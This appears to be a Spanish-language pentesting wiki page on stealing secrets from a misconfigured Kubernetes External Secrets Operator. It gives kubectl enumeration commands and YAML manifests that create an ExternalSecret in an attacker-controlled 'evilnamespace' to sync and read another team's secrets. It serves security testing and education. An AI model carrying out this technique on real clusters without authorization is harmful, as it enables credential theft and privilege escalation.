# External Secret Operator

**El autor original de esta página es** [**Fares**](https://www.linkedin.com/in/fares-siala/)

Esta página ofrece algunas indicaciones sobre cómo puedes robar secretos de un ESO mal configurado o de una aplicación que utiliza ESO para sincronizar sus secretos.

## Disclaimer

La técnica mostrada a continuación solo puede funcionar cuando se cumplen ciertas circunstancias. Por ejemplo, depende de los requisitos necesarios para permitir que un secreto se sincronice en un espacio de nombres que posees / has comprometido. Necesitas averiguarlo por ti mismo.

## Prerequisites

1. Un punto de apoyo en un clúster de kubernetes / openshift con privilegios de administrador en un espacio de nombres
2. Acceso de lectura a al menos ExternalSecret a nivel de clúster
3. Averigua si hay etiquetas / anotaciones o membresía de grupo requeridas que permitan a ESO sincronizar tu secreto. Si tienes suerte, puedes robar libremente cualquier secreto definido.

### Gathering information about existing ClusterSecretStore

Suponiendo que tienes un usuario que tiene suficientes derechos para leer este recurso; comienza por listar primero los _**ClusterSecretStores**_ existentes.
```sh
kubectl get ClusterSecretStore
```
### Enumeración de ExternalSecret

Supongamos que encontraste un ClusterSecretStore llamado _**mystore**_. Continúa enumerando su externalsecret asociado.
```sh
kubectl get externalsecret -A | grep mystore
```
_Este recurso está limitado al espacio de nombres, así que a menos que ya sepas en qué espacio de nombres buscar, agrega la opción -A para buscar en todos los espacios de nombres._

Deberías obtener una lista de externalsecret definidos. Supongamos que encontraste un objeto externalsecret llamado _**mysecret**_ definido y utilizado por el espacio de nombres _**mynamespace**_. Reúne un poco más de información sobre qué tipo de secreto contiene.
```sh
kubectl get externalsecret myexternalsecret -n mynamespace -o yaml
```
### Assembling the pieces

Desde aquí puedes obtener el nombre de uno o varios nombres de secretos (como se define en el recurso Secret). Obtendrás una salida similar a:
```yaml
kind: ExternalSecret
metadata:
annotations:
...
labels:
...
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
...
```
Hasta ahora hemos obtenido:

- Nombre de un ClusterSecretStore
- Nombre de un ExternalSecret
- Nombre del secreto

Ahora que tenemos todo lo que necesitamos, puedes crear un ExternalSecret (y eventualmente parchear/crear un nuevo Namespace para cumplir con los requisitos necesarios para sincronizar tu nuevo secreto):
```yaml
kind: ExternalSecret
metadata:
name: myexternalsecret
namespace: evilnamespace
spec:
data:
- remoteRef:
conversionStrategy: Default
decodingStrategy: None
key: SECRET_KEY
secretKey: SOME_PASSWORD
refreshInterval: 30s
secretStoreRef:
kind: ClusterSecretStore
name: mystore
target:
creationPolicy: Owner
deletionPolicy: Retain
name: leaked_secret
```

```yaml
kind: Namespace
metadata:
annotations:
required_annotation: value
other_required_annotation: other_value
labels:
required_label: somevalue
other_required_label: someothervalue
name: evilnamespace
```
Después de unos minutos, si se cumplieron las condiciones de sincronización, deberías poder ver el secreto filtrado dentro de tu espacio de nombres.
```sh
kubectl get secret leaked_secret -o yaml
```
## Referencias

{{#ref}}
https://external-secrets.io/latest/
{{#endref}}

{{#ref}}
https://github.com/external-secrets/external-secrets
{{#endref}}
